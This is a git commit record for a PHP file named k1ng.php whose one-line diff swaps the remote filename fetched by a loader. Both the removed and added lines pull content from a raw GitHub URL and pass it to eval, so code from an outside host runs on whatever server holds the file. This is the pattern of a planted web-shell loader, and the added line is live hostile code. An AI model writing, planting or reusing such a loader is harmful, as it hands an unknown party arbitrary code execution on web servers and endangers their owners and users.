da6238bf088b8fc4d8ba6552452f8f8329cfca79
KosameAmegai <84204311+KosameAmegai@users.noreply.github.com>
2022-12-03 14:12:43 +0700

    Update k1ng.php

--- k1ng.php
+++ k1ng.php
@@ -1,1 +1,1 @@
-<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/KosameAmegai/wkwk/main/lol.htm"));?>
+<?=eval("?>".file_get_contents("https://raw.githubusercontent.com/KosameAmegai/wkwk/main/l0l.htm"));?>
